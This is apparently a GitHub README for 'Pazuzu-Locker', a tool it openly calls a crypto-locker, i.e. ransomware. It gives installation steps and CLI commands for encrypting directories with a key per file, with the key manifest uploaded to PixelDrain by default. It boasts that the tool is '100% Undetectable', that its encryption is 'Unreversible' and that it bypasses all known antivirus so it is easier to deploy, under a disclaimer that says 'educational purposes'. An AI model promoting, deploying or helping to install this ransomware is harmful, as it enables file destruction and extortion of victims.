![banner](https://github.com/natekali/Pazuzu-Locker/assets/117448792/a530e303-9b3b-4c1d-87c9-290544ecb1c3)

# Pazuzu-Locker 👿

Brand new Crypto-Locker made using **Fernet** encryption method, featuring a **powerful CLI** built with Typer and Rich for enhanced user experience. The tool encrypts files using **unique keys** per file, making forensics investigations **harder**, even **impossible**. At the end of encryption, a **CSV manifest** is created, uploaded to PixelDrain (or stored locally), and used for decryption. **Pazuzu Locker v2.0** introduces modern CLI commands, safety confirmations, and rich terminal output.

## ⛔️ Disclaimer 
I made this software, and **I'm not responsible** for what you do with it or any problems it causes. **By using it, you agree to this rule.**

## 🐉 Features
* **100% Automatic & 100% Undetectable**
* **Modern CLI Interface** with Typer and Rich
* **Safety Confirmations** for wide-directory operations
* **Dry-run Mode** for previewing actions
* **Multiple Storage Providers** (PixelDrain, Local)
* **Encryption Method Unreversible**
* **Error Handled for Persistent Execution**
* **Comprehensive & Easy Usage**
 
## ℹ️ Prerequisites

Before running Pazuzu Locker, make sure you have Python 3.8+ and install the required libraries:

```bash
pip3 install -r requirements.txt
```

Or install directly as a package:

```bash
pip3 install -e .
```

## 🛠️ Installation

**Option 1: Install as a package (recommended)**

```bash
git clone https://github.com/natekali/Pazuzu-Locker.git
cd Pazuzu-Locker
pip3 install -e .
```

This installs the `pazuzu-locker` command globally.

**Option 2: Use from source**

```bash
git clone https://github.com/natekali/Pazuzu-Locker.git
cd Pazuzu-Locker
pip3 install -r requirements.txt
python3 -m pazuzu_locker.cli --help
```

## 📦 CLI Usage

### Getting Started

Check the available commands:

```bash
pazuzu-locker --help
```

### Commands

#### 🔒 Encrypt

Encrypt files in a target directory using Fernet encryption:

```bash
# Basic encryption with prompts
pazuzu-locker encrypt --path ~/documents

# Force encryption without confirmation (use with caution!)
pazuzu-locker encrypt --path ~/documents --force

# Dry-run to preview what would be encrypted
pazuzu-locker encrypt --path ~/documents --dry-run

# Specify manifest path and provider
pazuzu-locker encrypt --path ~/documents --manifest /tmp/manifest.csv --provider local
```

**Options:**
- `--path, -p`: Target directory to encrypt (overrides conf.py)
- `--manifest, -m`: Path to store the manifest CSV
- `--provider`: Manifest storage provider (pixeldrain, local)
- `--dry-run`: Preview actions without making changes
- `--force`: Skip confirmation prompts
- `--log-level`: Logging verbosity (DEBUG, INFO, WARNING, ERROR)

#### 🔓 Decrypt

Decrypt files using a manifest from the storage provider:

```bash
# Decrypt using manifest from PixelDrain
pazuzu-locker decrypt --px-id FPJZjoAd

# Decrypt from local manifest file
pazuzu-locker decrypt --provider local --px-id /tmp/manifest.csv

# Dry-run to preview decryption
pazuzu-locker decrypt --px-id FPJZjoAd --dry-run
```

**Options:**
- `--px-id`: PixelDrain file ID for the manifest
- `--manifest`: Path to a local manifest (use with `--provider local`)
- `--provider`: Manifest storage provider (pixeldrain, local)
- `--dry-run`: Preview actions without restoring files
- `--force`: Skip confirmation prompts
- `--log-level`: Logging verbosity (DEBUG, INFO, WARNING, ERROR)

#### 📊 Status

Show status of the last encryption manifest:

```bash
# Show status of last manifest from config
pazuzu-locker status

# Inspect a specific manifest file
pazuzu-locker status --manifest /tmp/manifest.csv
```

The command prints the last recorded run summary (stored in `~/.pazuzu-locker/last_run.json`) and, when a local manifest is provided, displays table-based insights into its contents.

#### ⚙️ Config

Manage configuration settings:

```bash
# Show current resolved configuration
pazuzu-locker config --show

# Write a configuration template file
pazuzu-locker config --write-template ./my-conf.py

# Overwrite existing config template
pazuzu-locker config --write-template ./conf.py --overwrite
```

## 📝 Configuration

You can configure Pazuzu Locker using a `conf.py` file in the project root or override settings via CLI flags.

**Example conf.py:**

```python
param = {
    'start_dir': '/home/user/documents',
    'tmp_csv': '/tmp/pazuzu-manifest.csv',
    'pxfile_id': 'FPJZjoAd'
}
```

To generate a template:

```bash
pazuzu-locker config --write-template conf.py
```

## 🎨 Rich Terminal Output

Pazuzu Locker v2.0 features beautiful, informative terminal output:

- **Rich tables** displaying encryption/decryption statistics
- **Progress indicators** for file operations
- **Colored output** for errors, warnings, and success messages
- **Summary panels** showing results and manifest locations

## 🔐 Safety Features

### Confirmation Prompts

When encrypting large directories (>100 files), Pazuzu Locker will prompt for confirmation:

```
⚠️  Warning: You are about to encrypt 250 files!
Proceed with encryption of 250 files in /home/user/documents? [y/N]:
```

Use `--force` to bypass prompts for automation.

### Dry-run Mode

Preview operations without making changes:

```bash
pazuzu-locker encrypt --path ~/documents --dry-run
```

## 📤 Storage Providers

### PixelDrain (default)

Uploads manifests to PixelDrain for remote storage:

```bash
pazuzu-locker encrypt --path ~/docs --provider pixeldrain
```

### Local

Stores manifests locally on disk:

```bash
pazuzu-locker encrypt --path ~/docs --provider local --manifest /tmp/manifest.csv
```

## 🧪 Exit Codes

- `0`: Success
- `1`: Configuration error
- `2`: Encryption error
- `3`: Decryption error
- `4`: Provider error
- `5`: User abort

## 🐝 VirusTotal Check

**Pazuzu Locker** can easily **bypass all known antivirus**, making it **easier** to deploy

![VT_check](https://github.com/natekali/Pazuzu-Locker/assets/117448792/d336c9b5-3cda-42d4-a506-093bc92cecbc)

## 👽 Legacy Usage

The original `pazuzu.py` and `decryptor.py` scripts are still available for backwards compatibility:

```bash
# Encryption (legacy)
python3 pazuzu.py

# Decryption (legacy)
python3 decryptor.py
```

However, the new CLI is recommended for all new workflows.

## 💼 Author

* [@natekali](https://github.com/natekali)

## 📄 License

This project is provided as-is for educational and research purposes only.
